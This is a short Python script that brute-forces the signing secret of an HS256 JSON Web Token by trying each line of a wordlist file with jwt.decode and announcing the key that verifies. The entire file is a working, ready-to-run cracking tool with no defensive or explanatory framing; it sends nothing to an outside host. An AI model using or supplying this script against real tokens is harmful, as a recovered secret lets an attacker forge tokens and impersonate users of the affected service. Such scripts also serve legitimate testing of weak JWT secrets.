import jwt


token = 'paste your jwt token'

print("Cracking is started... 🕵️‍♂️")

with open("secrets.txt", "r") as file:
    for line in file:
        secret = line.strip()
        try:
            # try all the token to open
            jwt.decode(token, secret, algorithms=["HS256"])
            print(f"\n[+] BOOM! 💥 Secret key found: {secret}")
            break
        except jwt.InvalidSignatureError:
            pass
        except Exception as e:
            print(f"Error: {e}")
            break